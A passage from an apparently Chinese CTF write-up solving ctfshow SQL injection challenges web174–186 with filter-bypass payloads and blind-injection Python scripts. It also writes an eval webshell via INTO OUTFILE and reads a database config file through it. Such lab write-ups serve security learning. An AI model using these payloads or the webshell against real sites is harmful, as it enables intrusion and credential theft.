style="color:#d4d4d4">%</span><span style="color:#b5cea8">72</span><span style="color:#d4d4d4">%6e%</span><span style="color:#b5cea8">61</span><span style="color:#d4d4d4">%6d%</span><span style="color:#b5cea8">65</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">20</span><span style="color:#d4d4d4">%3d%</span><span style="color:#b5cea8">20</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">27</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">66</span><span style="color:#d4d4d4">%6c%</span><span style="color:#b5cea8">61</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">67</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4"># decode:</span></span>
<span class="line"><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">1</span><span style="color:#ce9178">' union select '</span><span style="color:#d4d4d4">a</span><span style="color:#ce9178">',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(b.password,"0",")"),"9","("),"8","*"),"7","&amp;"),"6","^"),"5","%"),"4","$"),"3","#"),"2","@"),"1","!") from ctfshow_user4 as b where b.username = '</span><span style="color:#d4d4d4">flag</span></span></code></pre></div></div></figure><p>最终得到 flag：</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ctfshow{^c!a@#$)-ffce-$bdb-a#^d-^(fa$%)$#((@}</span></span></code></pre></div></div></figure><p>可以自己写脚本，也可以手动替换得到：</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ctfshow{6c1a2340-ffce-4bdb-a36d-69fa45043992}</span></span></code></pre></div></div></figure><h4 id="解2盲注todo"><a class="markdownIt-Anchor" href="#解2盲注todo"></a> 解 2. 盲注（todo）</h4><h4 id="解3写入shell见web175"><a class="markdownIt-Anchor" href="#解3写入shell见web175"></a> 解 3. 写入 shell（见 web175）</h4><h3 id="web175匹配全ascii字符写马"><a class="markdownIt-Anchor" href="#web175匹配全ascii字符写马"></a> web175（匹配全 ASCII 字符，写马）</h3><p>查询语句：</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4"># 拼接sql语句查找指定ID用户</span></span>
<span class="line"><span style="color:#d4d4d4">$</span><span style="color:#569cd6">sql</span><span style="color:#d4d4d4"> = </span><span style="color:#ce9178">"select username,password from ctfshow_user5 where username !='flag' and id = '"</span><span style="color:#d4d4d4">.$_GET['id'].</span><span style="color:#ce9178">"' limit 1;"</span><span style="color:#d4d4d4">;</span></span></code></pre></div></div></figure><p>返回逻辑：</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4"># 检查结果是否有flag</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">if</span><span style="color:#d4d4d4">(!preg_match(</span><span style="color:#ce9178">'/[\x00-\x7f]/i'</span><span style="color:#d4d4d4">, json_encode($ret))){</span></span>
<span class="line"><span style="color:#d4d4d4">      $ret['msg']=</span><span style="color:#ce9178">'查询成功'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span></code></pre></div></div></figure><p>这里的	\x00-\x7f	匹配的是 ASCII 字符集中的任意字符</p><p>也就是说正常的办法是没有用了，只好尝试写文件之类的：</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4"># payload</span></span>
<span class="line"><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">1</span><span style="color:#ce9178">' union select 1,"&lt;?php eval($_POST[1]);?&gt;" into outfile '</span><span style="color:#d4d4d4">/var/www/html/</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">.php</span></span></code></pre></div></div></figure><p>之后访问 1.php 文件即可连上找 flag。</p><p>进行数据库操作：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301152202516.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230115220220389"></p><p>数据库的密码可以在 1.php 的页面 getshell 之后找到：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">=</span><span style="color:#dcdcaa">system</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"tac ./api/config.php"</span><span style="color:#d4d4d4">);</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301152202484.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230115220258370"></p><p>添加之后直接搜索即可：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301152204504.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230115220426371"></p><h3 id="web176or万能密码"><a class="markdownIt-Anchor" href="#web176or万能密码"></a> web176（or 万能密码）</h3><p>payload:</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">1</span><span style="color:#ce9178">' or username='</span><span style="color:#d4d4d4">flag</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301161242930.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230116124219837"></p><h3 id="web177空格过滤"><a class="markdownIt-Anchor" href="#web177空格过滤"></a> web177（空格过滤）</h3><p>将空格用注释 /**/ 代替</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">1</span><span style="color:#ce9178">'/**/union/**/select/**/'</span><span style="color:#d4d4d4">a</span><span style="color:#ce9178">','</span><span style="color:#d4d4d4">b</span><span style="color:#ce9178">',c.password/**/from/**/ctfshow_user/**/as/**/c/**/where/**/username='</span><span style="color:#d4d4d4">flag</span><span style="color:#ce9178">';%23</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301161252969.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230116125209865"></p><h3 id="web178和空格过滤-反引号绕过"><a class="markdownIt-Anchor" href="#web178和空格过滤-反引号绕过"></a> web178（/**/ 和空格过滤 反引号绕过）</h3><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">1</span><span style="color:#ce9178">'%0aunion%0aselect'</span><span style="color:#b5cea8">1</span><span style="color:#ce9178">','</span><span style="color:#b5cea8">2</span><span style="color:#ce9178">',(select`password`from`ctfshow_user`where`username`='</span><span style="color:#d4d4d4">flag</span><span style="color:#ce9178">');%23</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301161310807.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230116131016677"></p><p>sql 语句中，<strong>表名、字段名、数据库名等可用反引号 (`)，也可以不使用反引号 ，但如果它包含特殊字符或保留字，则必须使用，如果不使用就会报错</strong>。所以反引号是用来区分 Mysql 的保留字与普通字符的。</p><p>这道题巧用反引号可绕过空格过滤。</p><h3 id="web179"><a class="markdownIt-Anchor" href="#web179"></a> web179</h3><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">1</span><span style="color:#ce9178">'%0cunion%0cselect'</span><span style="color:#b5cea8">1</span><span style="color:#ce9178">','</span><span style="color:#b5cea8">2</span><span style="color:#ce9178">',(select`password`from`ctfshow_user`where`username`='</span><span style="color:#d4d4d4">flag</span><span style="color:#ce9178">');%23</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301161320842.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230116132039747"></p><h3 id="web18023过滤"><a class="markdownIt-Anchor" href="#web18023过滤"></a> web180（%23 过滤）</h3><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#b5cea8">999</span><span style="color:#ce9178">'union%0cselect'</span><span style="color:#b5cea8">1</span><span style="color:#ce9178">',(select`password`from`ctfshow_user`where`username`='</span><span style="color:#d4d4d4">flag</span><span style="color:#ce9178">'),'</span><span style="color:#b5cea8">3</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301161329191.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230116132933108"></p><h3 id="web181or绕过"><a class="markdownIt-Anchor" href="#web181or绕过"></a> web181（or 绕过）</h3><p>过滤规则给写出来了：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">waf</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$str</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/ |</span><span style="color:#d7ba7d">\*</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">09|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">0a|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">0b|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">0c|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">00|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">0d|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">a0|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">23|</span><span style="color:#d7ba7d">\#</span><span style="color:#d16969">|file|into|select/i'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$str</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">  }</span></span></code></pre></div></div></figure><p>由于这里 select 被过滤，那么联合查询不可用，但是根据这里写出的规则，可以尝试万能密码：</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">1</span><span style="color:#ce9178">'%0cor%0cusername='</span><span style="color:#d4d4d4">flag</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301161340954.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230116134032852"></p><h3 id="web182like模糊查询"><a class="markdownIt-Anchor" href="#web182like模糊查询"></a> web182（like 模糊查询）</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#6a9955">//对传入的参数进行了过滤</span></span>
<span class="line"><span style="color:#d4d4d4">  </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">waf</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$str</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/ |</span><span style="color:#d7ba7d">\*</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">09|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">0a|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">0b|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">0c|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">00|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">0d|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">a0|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">23|</span><span style="color:#d7ba7d">\#</span><span style="color:#d16969">|file|into|select|flag/i'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$str</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">  }</span></span></code></pre></div></div></figure><p>虽然匹配了 flag 但是可以模糊查询：</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">1</span><span style="color:#ce9178">'%0cor%0cusername%0clike%0c'</span><span style="color:#d4d4d4">%fla%</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301161345721.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230116134502609"></p><h3 id="web183无回显盲注"><a class="markdownIt-Anchor" href="#web183无回显盲注"></a> web183（无回显盲注）</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">waf</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$str</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/ |</span><span style="color:#d7ba7d">\*</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">09|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">0a|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">0b|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">0c|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">0d|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">a0|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">00|</span><span style="color:#d7ba7d">\#</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">23|file|</span><span style="color:#d7ba7d">\=</span><span style="color:#d16969">|or|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">7c|select|and|flag|into/i'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$str</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">  }</span></span></code></pre></div></div></figure><p>查询语句：</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">$</span><span style="color:#569cd6">sql</span><span style="color:#d4d4d4"> = </span><span style="color:#ce9178">"select count(pass) from "</span><span style="color:#d4d4d4">.$_POST['tableName'].</span><span style="color:#ce9178">";"</span><span style="color:#d4d4d4">;</span></span></code></pre></div></div></figure><p>经过试探，知道表名没变还是 ctfshow_user</p><figure class="shiki python"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#c586c0">import</span><span style="color:#d4d4d4"> requests</span></span>
<span class="line"><span style="color:#c586c0">import</span><span style="color:#d4d4d4"> string</span></span>
<span class="line"><span style="color:#c586c0">import</span><span style="color:#d4d4d4"> time</span></span>
<span class="line"><span style="color:#6a9955"># 并发限制每秒不超过5个请求</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">url=</span><span style="color:#ce9178">"http://8785e5ba-d571-46c4-bb5d-36d14dada5b2.challenge.ctf.show/select-waf.php"</span></span>
<span class="line"><span style="color:#d4d4d4">flagstr=string.digits+string.ascii_lowercase+</span><span style="color:#ce9178">"{_-}"</span></span>
<span class="line"><span style="color:#6a9955"># string.digits是包含数字0-9</span></span>
<span class="line"><span style="color:#6a9955"># string.ascii_lowercase包含所有小写字符</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">flag=</span><span style="color:#ce9178">''</span></span>
<span class="line"><span style="color:#c586c0">for</span><span style="color:#d4d4d4"> i </span><span style="color:#c586c0">in</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">range</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">45</span><span style="color:#d4d4d4">):</span></span>
<span class="line"><span style="color:#d4d4d4">  </span><span style="color:#dcdcaa">print</span><span style="color:#d4d4d4">(i)</span></span>
<span class="line"><span style="color:#d4d4d4">  </span><span style="color:#c586c0">for</span><span style="color:#d4d4d4"> j </span><span style="color:#c586c0">in</span><span style="color:#d4d4d4"> flagstr:</span></span>
<span class="line"><span style="color:#d4d4d4">    data={</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#ce9178">'tableName'</span><span style="color:#d4d4d4">:</span><span style="color:#569cd6">f</span><span style="color:#ce9178">'(ctfshow_user)where(pass)regexp("^ctfshow</span><span style="color:#569cd6">{</span><span style="color:#d4d4d4">flag+j</span><span style="color:#569cd6">}</span><span style="color:#ce9178">")'</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    r=requests.post(url,</span><span style="color:#9cdcfe">data</span><span style="color:#d4d4d4">=data)</span></span>
<span class="line"><span style="color:#d4d4d4">    time.sleep(</span><span style="color:#b5cea8">0.3</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"user_count = 1"</span><span style="color:#d4d4d4">  </span><span style="color:#569cd6">in</span><span style="color:#d4d4d4"> r.text):</span></span>
<span class="line"><span style="color:#d4d4d4">      </span><span style="color:#dcdcaa">print</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"--------------------&gt;"</span><span style="color:#d4d4d4"> + j + </span><span style="color:#ce9178">" is right"</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#d4d4d4">      flag+=j</span></span>
<span class="line"><span style="color:#d4d4d4">      </span><span style="color:#c586c0">break</span></span>
<span class="line"><span style="color:#dcdcaa">print</span><span style="color:#d4d4d4">(flag)</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301161432941.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230116143212836"></p><h3 id="web184"><a class="markdownIt-Anchor" href="#web184"></a> web184</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">waf</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$str</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">  </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/</span><span style="color:#d7ba7d">\*</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">09|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">0a|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">0b|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">0c|</span><span style="color:#d7ba7d">\0</span><span style="color:#d16969">x0d|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">a0|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">00|</span><span style="color:#d7ba7d">\#</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">23|file|</span><span style="color:#d7ba7d">\=</span><span style="color:#d16969">|or|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">7c|select|and|flag|into|where|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">26|</span><span style="color:#d7ba7d">\'</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\"</span><span style="color:#d16969">|union|</span><span style="color:#d7ba7d">\`</span><span style="color:#d16969">|sleep|benchmark/i'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$str</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><figure class="shiki python"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#c586c0">import</span><span style="color:#d4d4d4"> requests</span></span>
<span class="line"><span style="color:#c586c0">import</span><span style="color:#d4d4d4"> string</span></span>
<span class="line"><span style="color:#c586c0">import</span><span style="color:#d4d4d4"> time</span></span>
<span class="line"><span style="color:#6a9955"># 并发限制每秒不超过5个请求</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">url=</span><span style="color:#ce9178">"http://4de16589-58a4-46b8-98ce-3d86c624175a.challenge.ctf.show/select-waf.php"</span></span>
<span class="line"><span style="color:#d4d4d4">flagstr=string.digits+string.ascii_lowercase+</span><span style="color:#ce9178">"{_-}"</span></span>
<span class="line"><span style="color:#6a9955"># string.digits是包含数字0-9</span></span>
<span class="line"><span style="color:#6a9955"># string.ascii_lowercase包含所有小写字符</span></span>
<span class="line"><span style="color:#6a9955"># 由于单引号和双引号都被过滤 需要转hex</span></span>
<span class="line"><span style="color:#569cd6">def</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">str2hex</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">a</span><span style="color:#d4d4d4">):</span></span>
<span class="line"><span style="color:#d4d4d4">  a1 = </span><span style="color:#ce9178">''</span></span>
<span class="line"><span style="color:#d4d4d4">  a2 = </span><span style="color:#ce9178">''</span></span>
<span class="line"><span style="color:#d4d4d4">  </span><span style="color:#c586c0">for</span><span style="color:#d4d4d4"> i </span><span style="color:#c586c0">in</span><span style="color:#d4d4d4"> a:</span></span>
<span class="line"><span style="color:#d4d4d4">    a1 += </span><span style="color:#dcdcaa">hex</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">ord</span><span style="color:#d4d4d4">(i))</span></span>
<span class="line"><span style="color:#d4d4d4">  a2 = a1.replace(</span><span style="color:#ce9178">"0x"</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">""</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#d4d4d4">  </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> a2  </span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">flag=</span><span style="color:#ce9178">''</span></span>
<span class="line"><span style="color:#c586c0">for</span><span style="color:#d4d4d4"> i </span><span style="color:#c586c0">in</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">range</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">45</span><span style="color:#d4d4d4">):</span></span>
<span class="line"><span style="color:#d4d4d4">  </span><span style="color:#dcdcaa">print</span><span style="color:#d4d4d4">(i)</span></span>
<span class="line"><span style="color:#d4d4d4">  </span><span style="color:#c586c0">for</span><span style="color:#d4d4d4"> j </span><span style="color:#c586c0">in</span><span style="color:#d4d4d4"> flagstr:</span></span>
<span class="line"><span style="color:#d4d4d4">    key = str2hex(</span><span style="color:#569cd6">f</span><span style="color:#ce9178">'^ctfshow</span><span style="color:#569cd6">{</span><span style="color:#d4d4d4">flag+j</span><span style="color:#569cd6">}</span><span style="color:#ce9178">'</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#d4d4d4">    data={</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#ce9178">'tableName'</span><span style="color:#d4d4d4">:</span><span style="color:#569cd6">f</span><span style="color:#ce9178">'ctfshow_user group by pass having pass regexp(0x</span><span style="color:#569cd6">{</span><span style="color:#d4d4d4">key</span><span style="color:#569cd6">}</span><span style="color:#ce9178">)'</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">print</span><span style="color:#d4d4d4">(data)</span></span>
<span class="line"><span style="color:#d4d4d4">    r=requests.post(url,</span><span style="color:#9cdcfe">data</span><span style="color:#d4d4d4">=data)</span></span>
<span class="line"><span style="color:#d4d4d4">    time.sleep(</span><span style="color:#b5cea8">0.3</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#6a9955">#print(r.text)</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"user_count = 1"</span><span style="color:#d4d4d4">  </span><span style="color:#569cd6">in</span><span style="color:#d4d4d4"> r.text):</span></span>
<span class="line"><span style="color:#d4d4d4">      </span><span style="color:#dcdcaa">print</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"--------------------&gt;"</span><span style="color:#d4d4d4"> + j + </span><span style="color:#ce9178">" is right"</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#d4d4d4">      flag+=j</span></span>
<span class="line"><span style="color:#d4d4d4">      </span><span style="color:#dcdcaa">print</span><span style="color:#d4d4d4">(flag)</span></span>
<span class="line"><span style="color:#d4d4d4">      </span><span style="color:#c586c0">break</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301161515341.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230116151549168"></p><h3 id="web185-186true数字构造concat拼接"><a class="markdownIt-Anchor" href="#web185-186true数字构造concat拼接"></a> web185-186（true 数字构造 concat 拼接）</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">waf</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$str</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">  </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/</span><span style="color:#d7ba7d">\*</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">09|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">0a|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">0b|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">0c|</span><span style="color:#d7ba7d">\0</span><span style="color:#d16969">x0d|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">a0|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">00|</span><span style="color:#d7ba7d">\#</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">23|[0-9]|file|</span><span style="color:#d7ba7d">\=</span><span style="color:#d16969">|or|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">7c|select|and|flag|into|where|</span><span style="color:#d7ba7d">\x</span><span style="color:#d16969">26|</span><span style="color:#d7ba7d">\'</span><span style="color:#d16969">|</span><span 